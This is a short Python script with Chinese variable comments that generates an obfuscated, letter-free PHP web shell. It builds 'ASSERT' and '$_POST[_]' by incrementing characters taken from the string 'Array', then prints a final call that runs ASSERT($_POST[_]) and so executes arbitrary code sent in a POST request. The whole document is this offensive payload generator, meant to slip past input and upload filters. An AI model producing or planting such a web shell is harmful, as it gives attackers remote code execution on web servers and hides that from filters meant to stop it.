"""
$_   为A
$__  是临时变量
$___ 开始作为存储变量
"""

pre = """
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0]; """
import string

cmds = ['ASSERT', "$_POST[_]"]
lst = []


def encode(i, cmd):
    var = "$" + '_' * (i + 3)
    lst.append(var)
    # payload = var + "=$_;"
    print(f'{var}="";')
    for c in cmd.upper():
        payload = f'$__=$_;'
        if c not in string.ascii_uppercase:
            payload += f'{var}.="{c}";'
        else:
            payload += '$__++;' * (ord(c.upper()) - ord('A'))
            payload += f'{var}.=$__;'

        print(payload)
    print()


print(pre)

for i, cmd in enumerate(cmds):
    encode(i, cmd)

for a, b in zip(cmds, lst):
    print(f'// {a} -> {b}')
print('$___($____);')  # ASSERT($_POST[_])
